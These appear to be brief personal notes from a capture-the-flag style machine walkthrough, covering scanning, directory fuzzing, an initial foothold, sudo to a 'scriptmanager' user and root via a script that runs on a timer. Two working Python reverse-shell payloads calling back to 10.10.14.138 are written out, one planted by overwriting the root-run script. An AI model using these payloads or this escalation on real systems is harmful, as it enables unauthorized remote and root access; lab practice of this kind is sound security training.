nmap
![[Pasted image 20260404191314.png]]

web
![[Pasted image 20260404193217.png]]

the github
![[Pasted image 20260404193307.png]]

the page is not found
![[Pasted image 20260404193429.png]]

while trying fuzzing the directories, got /dev
![[Pasted image 20260404193620.png]]

![[Pasted image 20260404193634.png]]

Got revshell
![[Pasted image 20260404193712.png]]
![[Pasted image 20260404193956.png]]

can use sudo for scriptmanager user
![[Pasted image 20260404194959.png]]

got revshell as scriptmanager user
![[Pasted image 20260404195119.png]]
```bash
sudo -u scriptmanager python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.138',4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

there's folder /scripts on system and contain two file that will run every some minutes as root
![[Pasted image 20260404195354.png]]

change the code to this, so we get the rev shell as root
```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.138",4449))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

Overwrite the code
![[Pasted image 20260404195847.png]]

and we got the rev shell root
![[Pasted image 20260404195943.png]]

